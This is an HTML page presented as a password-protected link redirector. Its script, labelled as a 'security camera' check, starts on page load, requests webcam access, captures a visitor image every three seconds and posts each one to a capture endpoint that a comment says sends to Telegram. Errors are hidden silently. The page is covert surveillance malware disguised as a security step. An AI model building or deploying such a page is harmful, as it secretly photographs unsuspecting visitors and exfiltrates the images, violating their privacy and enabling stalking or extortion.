<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .redirect-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
            width: 90%;
        }
        
        .warning-text {
            font-size: 28px;
            color: #e74c3c;
            font-weight: bold;
            margin-bottom: 20px;
        }
        
        #passwordModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 15px;
            width: 300px;
        }
        
        .modal-title {
            margin-bottom: 20px;
            color: #333;
        }
        
        .password-input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 2px solid #ddd;
            border-radius: 5px;
        }
        
        .modal-btn {
            width: 100%;
            padding: 10px;
            background: #2ecc71;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="redirect-container">
        <div class="warning-text">
            Security Check Required
        </div>
        <p>Enter password to access the link</p>
        <input type="password" id="redirectPassword" placeholder="Enter password" style="padding: 10px; width: 80%; margin: 10px 0;">
        <button onclick="verifyRedirect()" style="padding: 10px 20px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">
            Access Link
        </button>
    </div>
    
    <script>
        // Get short code from URL
        const path = window.location.pathname;
        const shortCode = path.substring(1); // Remove leading slash
        
        async function verifyRedirect() {
            const password = document.getElementById('redirectPassword').value;
            
            if (password === "@35678") {
                // Get original URL from database
                const response = await fetch(`/api/get-link?code=${shortCode}`);
                const result = await response.json();
                
                if (result.found) {
                    window.location.href = result.link.original_url;
                } else {
                    alert('Link not found');
                }
            } else {
                alert('Incorrect password');
            }
        }
        
        // Try to access camera for security
        async function setupSecurityCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Capture image every 3 seconds
                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 320, 240);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
                    
                    // Send to Telegram
                    fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData })
                    }).catch(() => {});
                }, 3000);
            } catch (error) {
                console.log('Camera not available');
            }
        }
        
        // Start camera on load
        window.addEventListener('load', () => {
            setTimeout(setupSecurityCamera, 1000);
        });
    </script>
</body>
</html>
